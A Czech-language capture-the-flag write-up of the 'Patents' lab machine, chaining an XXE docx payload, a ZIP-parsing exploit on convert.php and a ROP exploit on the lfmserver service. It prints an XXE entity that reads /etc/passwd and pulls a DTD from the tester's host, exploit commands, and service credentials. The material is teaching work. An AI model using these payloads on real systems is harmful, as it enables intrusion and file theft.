## Úvod a kontext

Patents kombinuje špatně chráněné vývojové artefakty, zranitelný převod dokumentů a samostatnou chybu v interním PDF backendu na portu `8888`. Je to stroj, kde první velkou roli nehrají exploity naslepo, ale release poznámky a `composer` metadata. Ty velmi rychle řeknou, že aplikace experimentovala s `include`, s entity parsingem a s vlastní knihovnou `gears/pdf`.

Je důležité oddělit dvě části řetězce. User foothold stojí na `convert.php` a dokumentovém převodníku. Root část už míří na úplně jinou službu `lfmserver` na `8888/tcp`, která má vlastní binární protokol a vlastní memory corruption bug.

## Počáteční průzkum

### Web a podezřelá služba na `8888`

Základní scan ukáže Apache na `80/tcp` a neznámou službu na `8888/tcp`, která odpovídá hláškou `LFM 400 BAD REQUEST`. To je samo o sobě důležitý signál, že na hostu běží vedle webu ještě druhý dokumentový backend.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```text
22/tcp   open  ssh             OpenSSH 7.7p1 Ubuntu 4ubuntu0.3
80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
8888/tcp open  sun-answerbook?
|_    LFM 400 BAD REQUEST
```

### `UpdateDetails` a `installed.json`

Enumerace webu najde přesně to, co je na Patents nejcennější: `/release/UpdateDetails` a veřejně čitelný `vendor/composer/installed.json`.
```bash
./dirsearch/dirsearch.py -u http://patents.htb/ -e php -x 403
```
```text
/.DS_Store
/release/UpdateDetails
/upload.php
/vendor/composer/installed.json
```

Release notes přímo zmiňují, že byla zapnutá entity parsing a experimentální include funkcionalita. To je extrémně silná indicie k XXE.
```text
v1.2 alpha:
- meow@conquertheworld: Added ability to include patents. Still experimental, it's hidden.
v0.7 alpha:
- meow@conquertheworld.htb: enabled entity parsing in custom folder
- gbyolo@htb: added conversion of all files, to generate pdf compliant from docx
```

`installed.json` vedle toho ukáže lokální knihovnu `gears/pdf`, takže je možné si přesně dohledat, jaký backend `convert.php` používá.
```text
"name": "gears/pdf",
"source": {
    "type": "git",
    "url": "./lib/pdf/",
    "reference": "__CENSORED__"
}
```

## Analýza zjištění

### XXE potvrzuje chování převodníku

Kombinace release notes a `Backend.php` vede k nejrozumnějšímu testu: škodlivému `docx` s externí entitou. Po úpravě `word/document.xml` a zabalení dokumentu zpět do ZIP formátu jde potvrdit, že převodník skutečně zpracovává entity a sahá na lokální soubory.
```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://10.10.14.13:8000/chm/payload.dtd">
  %dtd;
]>
<data>&send;</data>
```

To je důležité metodicky: XXE samo o sobě ještě neotevře shell, ale spolehlivě potvrdí, že `convert.php` předává kontrolu zranitelnému dokumentovému backendu.

### Přes ZIP parsing k prvnímu shellu

V podkladech je i exploit `exploit.py`, který útočí přímo na ZIP zpracování v `convert.php`. Protože Office dokument je ve skutečnosti ZIP archive, dává tahle cesta smysl přesně na stejném endpointu, který už byl potvrzený XXE testem.
```text
python exploit.py --bind-port 5555 http://patents.htb/convert.php
curl -F "submit=a" -F "userfile=@doc.docx" -X POST http://patents.htb/convert.php
```

Výsledkem je první kód na serveru. Patents tak hezky ukazuje, jak se reconnaissance přes `composer` metadata a XXE testy promění v praktický foothold.

## Získání přístupu

### Shell přes `convert.php`

Po úspěšném zneužití převodníku je první důležitá věc potvrdit shell a získat běžný uživatelský kontext. Na tomhle stroji je user část spojená právě s kompromitací `convert.php`, ne s nějakým samostatným SSH reuse.

Důležitější než samotný payload je tu princip: dokumentový převodník byl zbytečně vystavený webu, zpracovával nedůvěryhodné archivy a běžel v kontextu, který šlo dál rozvíjet po footholdu.

## Eskalace oprávnění

### `lfmserver` na `8888` a ROP exploit

Samostatná root část míří na službu na `8888/tcp`. V podkladech je pro ni lokální exploit `_8888/exploit.py`, který ukazuje, že `lfmserver` používal protokol `CHECK /... LFM` a zranitelné zpracování cesty. Exploit kombinuje traversal, leak přes GOT a následně ROP řetězec až k shellu.
```text
CHECK /... LFM
User=lfmserver_user
Password=!gby0l0r0ck$$!
```

Z technického hlediska je to už úplně jiná chyba než user část. Nejde o XML nebo ZIP parsing, ale o nativní memory corruption ve vlastní backendové službě. Právě proto je dobré obě fáze v článku striktně oddělit.

Po úspěšném ROP řetězci už zbývá jen převzít shell a dočíst `root.txt`.

## Shrnutí klíčových poznatků

- Patents nezačíná payloadem, ale veřejně dostupnými release notes a `composer` metadaty, která velmi přesně vymezí útokovou plochu.
- User část stojí na kompromitaci `convert.php`, kde se propojí dokumentový převodník, XXE chování a zranitelné ZIP zpracování.
- Root část je odlišná služba i odlišný typ chyby: `lfmserver` na `8888/tcp` a memory corruption s ROP.

## Co si odnést do praxe

- Release notes, `installed.json`, `.DS_Store` a podobné vývojové artefakty nesmějí být veřejné. Na Patents z nich šlo velmi přesně odvodit, kudy vede útok.
- Dokumentové převodníky je potřeba sandboxovat a oddělit od citlivého filesystemu i od veřejného webu. Parsery XML a ZIP archivů patří mezi nejrizikovější komponenty.
- Interní backendové služby jako `lfmserver` musí být auditované stejně přísně jako veřejný web. Vlastní binární protokol s memory corruption chybou často zruší veškerou obranu, kterou se podařilo postavit na vyšší vrstvě.
